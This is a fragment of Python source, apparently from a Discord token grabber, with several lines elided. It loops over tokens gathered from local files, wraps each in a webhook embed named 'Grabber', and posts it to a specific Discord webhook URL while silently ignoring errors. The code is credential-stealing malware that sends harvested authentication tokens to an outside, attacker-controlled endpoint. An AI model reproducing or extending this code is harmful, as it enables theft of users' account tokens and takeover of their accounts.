        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    ...
                    "username": "Grabber",
                    "avatar_url": "https://mbkeyprog.com/cdn/shop/products/1-token_1024x1024_b9c1be88-32a7-42c8-82d0-c33965b47671_grande.jpg?v=1549623780"
                }

                requests.post('https://discord.com/api/webhooks/1340269849200427009/XYs1lAHvwToQADkG68_qKhs1BcySUdv2A5TCC4ifCnC3ZEsKyqegq3Z3r0dJ-v5TTla-', json=embed_user, headers=getheaders())
            except:
                continue
